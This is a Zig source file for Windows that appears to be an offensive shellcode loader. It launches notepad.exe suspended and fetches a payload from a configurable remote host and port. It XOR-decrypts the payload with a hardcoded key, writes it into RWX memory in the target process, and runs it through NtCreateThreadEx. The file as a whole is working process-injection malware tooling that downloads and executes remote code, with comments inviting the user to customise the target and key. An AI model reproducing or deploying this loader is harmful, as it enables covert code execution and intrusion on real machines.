const std = @import("std");
const build_options = @import("build_options");
const helpers = @import("helpers.zig");
const windows = std.os.windows;

extern "kernel32" fn OpenProcess(dwDesiredAccess: windows.DWORD, bInheritHandle: windows.BOOL, dwProcessId: windows.DWORD) ?windows.HANDLE;
extern "kernel32" fn CloseHandle(hObject: windows.HANDLE) windows.BOOL;
extern "kernel32" fn VirtualAllocEx(hProcess: windows.HANDLE, lpAddress: ?windows.LPVOID, dwSize: usize, flAllocationType: windows.DWORD, flProtect: windows.DWORD) ?windows.LPVOID;
extern "kernel32" fn WriteProcessMemory(hProcess: windows.HANDLE, lpBaseAddress: windows.LPVOID, lpBuffer: [*]const u8, nSize: usize, lpNumberOfBytesWritten: ?*usize) windows.BOOL;
extern "kernel32" fn CreateRemoteThread(hProcess: windows.HANDLE, lpThreadAttributes: ?*anyopaque, dwStackSize: usize, lpStartAddress: windows.LPVOID, lpParameter: ?windows.LPVOID, dwCreationFlags: windows.DWORD, lpThreadId: ?*windows.DWORD) ?windows.HANDLE;
extern "kernel32" fn ResumeThread(hThread: windows.HANDLE) windows.DWORD;
extern "ntdll" fn NtCreateThreadEx(ThreadHandle: *windows.HANDLE, DesiredAccess: windows.ACCESS_MASK, ObjectAttributes: ?*anyopaque, ProcessHandle: windows.HANDLE, StartRoutine: windows.LPTHREAD_START_ROUTINE, Argument: ?windows.LPVOID, CreateFlags: windows.ULONG, ZeroBits: windows.SIZE_T, StackSize: windows.SIZE_T, MaximumStackSize: windows.SIZE_T, AttributeList: ?*anyopaque) windows.NTSTATUS;

extern "kernel32" fn GetThreadContext(
    hThread: windows.HANDLE,
    lpContext: *windows.CONTEXT,
) windows.BOOL;

extern "kernel32" fn SetThreadContext(
    hThread: windows.HANDLE,
    lpContext: *const windows.CONTEXT,
) windows.BOOL;

const CREATE_SUSPENDED = 0x00000004;
const CONTEXT_FULL: u32 = 0x10000B;
const CONTEXT_ALL: u32 = CONTEXT_FULL | 0x1;
const PROCESS_ALL_ACCESS = 0x001FFFFF;

const PROGRAM_NAME = "c:\\windows\\notepad.exe"; // change this if u want
const KEY = "ziggoon"; // change this

fn getThreadContext(hThread: windows.HANDLE, context: *windows.CONTEXT) !void {
    context.ContextFlags = CONTEXT_ALL;

    if (GetThreadContext(hThread, context) == 0) {
        return windows.unexpectedError(windows.kernel32.GetLastError());
    }
}

fn setThreadContext(hThread: windows.HANDLE, context: *const windows.CONTEXT) !void {
    if (SetThreadContext(hThread, context) == 0) {
        return windows.unexpectedError(windows.kernel32.GetLastError());
    }
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    var si = std.mem.zeroes(windows.STARTUPINFOW);
    si.cb = @sizeOf(windows.STARTUPINFOW);
    var pi: windows.PROCESS_INFORMATION = undefined;
    const wide_program_name = try std.unicode.utf8ToUtf16LeAllocZ(std.heap.page_allocator, PROGRAM_NAME);
    defer std.heap.page_allocator.free(wide_program_name);
    std.debug.print("[+] Creating process in suspended state: {s}\n", .{PROGRAM_NAME});
    try windows.CreateProcessW(null, wide_program_name, null, null, windows.FALSE, CREATE_SUSPENDED, null, null, &si, &pi);
    var context: windows.CONTEXT = undefined;
    try getThreadContext(pi.hThread, &context);

    std.debug.print("[+] new process pid: {d}\n", .{pi.dwProcessId});

    const process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, pi.dwProcessId) orelse {
        std.debug.print("[!] failed to open pid {}: {}\n", .{ pi.dwProcessId, windows.kernel32.GetLastError() });
        return error.FailedToOpenProcess;
    };
    defer _ = CloseHandle(process_handle);

    std.debug.print("[+] process opened\n", .{});

    const shellcode = try helpers.download(allocator, build_options.host, build_options.port, build_options.size);
    defer allocator.free(shellcode);

    std.debug.print("[+] shellcode downloaded. size: {d}\n", .{shellcode.len});
    helpers.xor(shellcode, KEY);
    std.debug.print("[+] shellcode decrypted\n", .{});

    const remote_buffer = VirtualAllocEx(process_handle, null, shellcode.len, windows.MEM_RESERVE | windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE) orelse {
        std.debug.print("[!] failed to allocate memory in the remote process: {}\n", .{windows.kernel32.GetLastError()});
        return error.FailedToAllocateMemory;
    };

    std.debug.print("[+] remote buffer created @ 0x{x}\n", .{@intFromPtr(remote_buffer)});

    var bytes_written: usize = undefined;
    const write_result = WriteProcessMemory(process_handle, remote_buffer, @ptrCast(shellcode), shellcode.len, &bytes_written);

    if (write_result == 0) {
        std.debug.print("[!] failed to write process memory: {}\n", .{windows.kernel32.GetLastError()});
        return error.FailedToWriteMemory;
    }

    std.debug.print("[+] memory written to {d} @ 0x{x}\n", .{ pi.dwProcessId, @intFromPtr(remote_buffer) });

    var thread_handle: windows.HANDLE = undefined;
    const status = NtCreateThreadEx(&thread_handle, PROCESS_ALL_ACCESS, null, process_handle, @ptrCast(remote_buffer), null, 0x00000004, 0, 0, 0, null);
    if (status == .SUCCESS) {
        const resume_result = ResumeThread(thread_handle);
        if (resume_result == std.math.maxInt(windows.DWORD)) {
            std.debug.print("[!] failed to resume thread: {}\n", .{windows.kernel32.GetLastError()});
        } else {
            std.debug.print("[+] thread resumed successfully\n", .{});
        }
    }
    std.debug.print("[+] remote thread created successfully. status: {}\n", .{status});
    defer windows.CloseHandle(thread_handle);
}
